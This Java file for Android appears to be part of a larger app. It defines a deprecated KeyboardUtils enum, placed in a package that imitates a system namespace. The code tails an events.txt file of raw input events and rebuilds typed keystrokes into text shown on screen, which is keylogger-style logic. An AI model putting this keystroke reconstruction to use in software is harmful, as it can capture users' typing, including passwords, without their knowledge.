package android.service.app.utils;

import android.content.ContextWrapper;
import android.os.Environment;
import android.support.annotation.NonNull;

import java.io.BufferedReader;
import java.io.File;
import java.io.FileReader;
import java.io.IOException;

@Deprecated
public enum KeyboardUtils
{
    utils;

    public static final String EVENTS_TXT = "events.txt";

    private void handleGetEventOutput(final ContextWrapper wrapper)
    {
        final String path = Environment.getExternalStorageDirectory().getPath() + File.separator;

        new Thread(new Runnable()
        {
            @Override
            public void run()
            {
                try
                {
                    String filename = path + EVENTS_TXT;

                    BufferedReader reader = new BufferedReader(new FileReader(filename));
                    String text = "";
                    String line;

                    while (true)
                    {
                        try
                        {
                            line = reader.readLine();
                        }
                        catch (IOException e)
                        {
                            Log.error(e);
                            break;
                        }
                        if (line == null)
                        {
                            Thread.sleep(100);
                            continue;
                        }
                        int startSymbolIndex = line.indexOf("KEY_");
                        if (startSymbolIndex == -1) continue;
                        String subLine = line.substring(startSymbolIndex);
                        if (!subLine.contains("DOWN")) continue;
                        String symbolCandidate = subLine.substring(subLine.indexOf("_") + 1, subLine.indexOf(" "));

                        if ("SPACE".equals(symbolCandidate)) symbolCandidate = " ";
                        if ("ENTER".equals(symbolCandidate) || "TAB".equals(symbolCandidate))
                            symbolCandidate = ".";

                        if (symbolCandidate.length() == 1)
                        {
                            boolean isEndOfLine = ".".equals(symbolCandidate);
                            if (isEndOfLine) symbolCandidate = ".\n";
                            text += symbolCandidate;
                            if (isEndOfLine)
                            {
                                AndroidUtils.printDataOnScreen("# " + text, wrapper);
                                text = "";
                            }
                        }
                    }
                }
                catch (Exception e)
                {
                    Log.error(e);
                }
            }
        }).start();
    }

    @NonNull
    private static String getSdCardPath()
    {
        return Environment.getExternalStorageDirectory().getPath() + File.separator;
    }

}
